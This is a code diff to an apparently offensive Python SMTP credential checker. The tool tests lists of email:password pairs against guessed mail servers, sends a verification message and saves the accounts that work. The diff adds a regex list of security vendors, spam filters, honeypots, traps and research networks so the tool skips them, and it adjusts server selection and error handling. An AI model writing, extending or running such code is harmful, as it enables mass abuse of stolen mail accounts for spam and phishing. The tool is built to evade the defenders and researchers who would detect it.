@@ -18,6 +18,8 @@ custom_dns_nameservers = ['8.8.8.8', '8.8.4.4', '9.9.9.9', '149.112.112.112', '1
 autoconfig_url = 'https://autoconfig.thunderbird.net/v1.1/'
 # expanded lists of SMTP endpoints, where we can knock
 autoconfig_data_url = 'https://raw.githubusercontent.com/aels/mailtools/main/smtp-checker/autoconfigs_enriched.txt'
+# dangerous domains
+dangerous_domains = r'localhost|invalid|proofpoint|perimeterwatch|securence|techtarget|cisco|spiceworks|gartner|fortinet|retarus|checkpoint|fireeye|mimecast|forcepoint|trendmicro|acronis|sophos|sonicwall|cloudflare|trellix|barracuda|security|clearswift|trustwave|broadcom|helpsystems|zyxel|mdaemon|mailchannels|cyren|opswat|duocircle|uni-muenster|proxmox|censornet|guard|indevis|n-able|plesk|spamtitan|avanan|ironscales|mimecast|trustifi|shield|barracuda|essentials|libraesva|fucking-shit|please|kill-me-please|virus|bot|trap|honey|lab|virtual|vm|research|abus|security|filter|junk|rbl|ubl|spam|black|list|bad|free|brukalai|metunet|excello'
 
 b   = '\033[1m'
 z   = '\033[0m'
@@ -156,28 +158,29 @@ def guess_smtp_server(domain):
 	domains_arr = [domain, 'smtp-qa.'+domain, 'smtp.'+domain, 'mail.'+domain, 'webmail.'+domain, 'mx.'+domain]
 	try:
 		mx_domain = str(resolver_obj.resolve(domain, 'mx')[0].exchange)[0:-1]
-		# if re.search(r'protection\.outlook\.com$', mx_domain):
-		# 	return global_configs_cache['outlook.com']
-		domains_arr += [mx_domain]
-		for host in domains_arr:
-			try:
-				ip = get_rand_ip_of_host(host)
-			except:
-				continue
-			for port in [587, 465, 25]:
-				if is_listening(ip, port):
-						return ([host+':'+str(port)], default_login_template)
 	except:
-		pass
-	return False
+		raise Exception('no MX records found for: '+mx_domain)
+	if re.search(dangerous_domains, mx_domain):
+		raise Exception('\033[7;31mskipping dangerous domain: '+mx_domain+'\033[0m')
+	if re.search(r'protection\.outlook\.com$', mx_domain):
+		return global_configs_cache['outlook.com']
+	domains_arr += [mx_domain]
+	for host in domains_arr:
+		try:
+			ip = get_rand_ip_of_host(host)
+		except:
+			continue
+		for port in [587, 465, 25]:
+			if is_listening(ip, port):
+					return ([host+':'+str(port)], default_login_template)
+	raise Exception('no connection details found for '+domain)
 
 def get_smtp_config(domain):
 	global domain_configs_cache
 	domain = domain.lower()
 	if not domain in domain_configs_cache:
+		domain_configs_cache[domain] = False
 		domain_configs_cache[domain] = guess_smtp_server(domain)
-	if not domain_configs_cache[domain]:
-		raise Exception('no connection details found for '+domain)
 	return domain_configs_cache[domain]
 
 def get_free_smtp_server(smtp_server, port):
@@ -280,11 +283,10 @@ def worker_item(jobs_que, results_que):
 				results_que.put(f'getting settings for {smtp_user}:{password}')
 				if not smtp_server or not port:
 					smtp_server_port_arr, login_template = get_smtp_config(smtp_user.split('@')[1])
-					# smtp_server, port = random.choice(smtp_server_port_arr).split(':')
-					smtp_server, port = smtp_server_port_arr[0].split(':')
+					smtp_server, port = random.choice(smtp_server_port_arr).split(':')
 				results_que.put(blue('connecting to',0)+f' {smtp_server}|{port}|{smtp_user}|{password}')
 				smtp_connect_and_send(smtp_server, port, login_template, smtp_user, password)
-				results_que.put(green(smtp_user+':'+password,7)+(verify_email and green(' sent to '+verify_email,7)))
+				results_que.put(green(smtp_user+':'+password,7)+(verify_email and green(' sent\a to '+verify_email,7)))
 				open(smtp_filename, 'a').write(f'{smtp_server}|{port}|{smtp_user}|{password}\n')
 				goods += 1
 				time.sleep(1)
